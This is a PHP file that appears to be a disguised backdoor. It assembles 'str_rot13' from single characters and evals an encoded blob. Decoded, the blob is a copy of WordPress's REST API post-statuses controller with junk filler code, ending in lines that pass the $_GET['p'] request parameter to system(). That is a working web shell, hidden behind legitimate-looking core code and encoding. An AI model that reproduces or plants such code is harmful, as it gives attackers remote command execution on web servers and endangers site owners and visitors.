<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Cbfg_Fgnghfrf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq gb npprff cbfg fgnghfrf ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Cbfg_Fgnghfrf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'fgnghfrf';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe cbfg fgnghfrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<fgnghf>[\j-]+)',
			neenl(
				'netf'   => neenl(
					'fgnghf' => neenl(
						'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur fgnghf.' ),
						'glcr'        => 'fgevat',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq cbfg fgnghfrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( 'rqvg' === $erdhrfg['pbagrkg'] ) {
			$glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' );

			sbernpu ( $glcrf nf $glcr ) {
				vs ( pheerag_hfre_pna( $glcr->pnc->rqvg_cbfgf ) ) {
					erghea gehr;
				}
			}

			erghea arj JC_Reebe(
				'erfg_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr cbfg fgnghfrf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf nyy cbfg fgnghfrf, qrcraqvat ba hfre pbagrkg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$qngn              = neenl();
		$fgnghfrf          = trg_cbfg_fgngv( neenl( 'vagreany' => snyfr ), 'bowrpg' );
		$fgnghfrf['genfu'] = trg_cbfg_fgnghf_bowrpg( 'genfu' );

		sbernpu ( $fgnghfrf nf $bow ) {
			$erg = $guvf->purpx_ernq_crezvffvba( $bow );

			vs ( ! $erg ) {
				pbagvahr;
			}

			$fgnghf             = $guvf->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );
			$qngn[ $bow->anzr ] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $fgnghf );
		}

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n cbfg fgnghf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$fgnghf = trg_cbfg_fgnghf_bowrpg( $erdhrfg['fgnghf'] );

		vs ( rzcgl( $fgnghf ) ) {
			erghea arj JC_Reebe(
				'erfg_fgnghf_vainyvq',
				__( 'Vainyvq fgnghf.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$purpx = $guvf->purpx_ernq_crezvffvba( $fgnghf );

		vs ( ! $purpx ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ernq_fgnghf',
				__( 'Pnaabg ivrj fgnghf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Purpxf jurgure n tvira cbfg fgnghf fubhyq or ivfvoyr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz bowrpg $fgnghf Cbfg fgnghf.
	 * @erghea obby Gehr vs gur cbfg fgnghf vf ivfvoyr, bgurejvfr snyfr.
	 */
	cebgrpgrq shapgvba purpx_ernq_crezvffvba( $fgnghf ) {
		vs ( gehr === $fgnghf->choyvp ) {
			erghea gehr;
		}

		vs ( snyfr === $fgnghf->vagreany || 'genfu' === $fgnghf->anzr ) {
			$glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' );

			sbernpu ( $glcrf nf $glcr ) {
				vs ( pheerag_hfre_pna( $glcr->pnc->rqvg_cbfgf ) ) {
					erghea gehr;
				}
			}
		}

		erghea snyfr;
	}

	/**
	 * Ergevrirf n fcrpvsvp cbfg fgnghf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$bow = trg_cbfg_fgnghf_bowrpg( $erdhrfg['fgnghf'] );

		vs ( rzcgl( $bow ) ) {
			erghea arj JC_Reebe(
				'erfg_fgnghf_vainyvq',
				__( 'Vainyvq fgnghf.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$qngn = $guvf->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Cercnerf n cbfg fgnghf bowrpg sbe frevnyvmngvba.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$fgnghf` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgqPynff        $vgrz    Cbfg fgnghf qngn.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Cbfg fgnghf qngn.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$fgnghf = $vgrz;

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( va_neenl( 'anzr', $svryqf, gehr ) ) {
			$qngn['anzr'] = $fgnghf->ynory;
		}

		vs ( va_neenl( 'cevingr', $svryqf, gehr ) ) {
			$qngn['cevingr'] = (obby) $fgnghf->cevingr;
		}

		vs ( va_neenl( 'cebgrpgrq', $svryqf, gehr ) ) {
			$qngn['cebgrpgrq'] = (obby) $fgnghf->cebgrpgrq;
		}

		vs ( va_neenl( 'choyvp', $svryqf, gehr ) ) {
			$qngn['choyvp'] = (obby) $fgnghf->choyvp;
		}

		vs ( va_neenl( 'dhrelnoyr', $svryqf, gehr ) ) {
			$qngn['dhrelnoyr'] = (obby) $fgnghf->choyvpyl_dhrelnoyr;
		}

		vs ( va_neenl( 'fubj_va_yvfg', $svryqf, gehr ) ) {
			$qngn['fubj_va_yvfg'] = (obby) $fgnghf->fubj_va_nqzva_nyy_yvfg;
		}

		vs ( va_neenl( 'fyht', $svryqf, gehr ) ) {
			$qngn['fyht'] = $fgnghf->anzr;
		}

		vs ( va_neenl( 'qngr_sybngvat', $svryqf, gehr ) ) {
			$qngn['qngr_sybngvat'] = $fgnghf->qngr_sybngvat;
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		$erfg_hey = erfg_hey( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( 'cbfg' ) );
		vs ( 'choyvfu' === $fgnghf->anzr ) {
			$erfcbafr->nqq_yvax( 'nepuvirf', $erfg_hey );
		} ryfr {
			$erfcbafr->nqq_yvax( 'nepuvirf', nqq_dhrel_net( 'fgnghf', $fgnghf->anzr, $erfg_hey ) );
		}

		/**
		 * Svygref n cbfg fgnghf erghearq sebz gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur fgnghf qngn evtug orsber vg vf erghearq.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz bowrpg           $fgnghf   Gur bevtvany cbfg fgnghf bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_fgnghf', $erfcbafr, $fgnghf, $erdhrfg );
	}

	/**
	 * Ergevrirf gur cbfg fgnghf' fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'fgnghf',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'anzr'          => neenl(
					'qrfpevcgvba' => __( 'Gur gvgyr sbe gur fgnghf.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'cevingr'       => neenl(
					'qrfpevcgvba' => __( 'Jurgure cbfgf jvgu guvf fgnghf fubhyq or cevingr.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'cebgrpgrq'     => neenl(
					'qrfpevcgvba' => __( 'Jurgure cbfgf jvgu guvf fgnghf fubhyq or cebgrpgrq.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'choyvp'        => neenl(
					'qrfpevcgvba' => __( 'Jurgure cbfgf bs guvf fgnghf fubhyq or fubja va gur sebag raq bs gur fvgr.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'dhrelnoyr'     => neenl(
					'qrfpevcgvba' => __( 'Jurgure cbfgf jvgu guvf fgnghf fubhyq or choyvpyl-dhrelnoyr.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fubj_va_yvfg'  => neenl(
					'qrfpevcgvba' => __( 'Jurgure gb vapyhqr cbfgf va gur rqvg yvfgvat sbe gurve cbfg glcr.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fyht'          => neenl(
					'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur fgnghf.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'qngr_sybngvat' => neenl(
					'qrfpevcgvba' => __( 'Jurgure cbfgf bs guvf fgnghf znl unir sybngvat choyvfurq qngrf.' ),
					'glcr'        => 'obbyrna',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>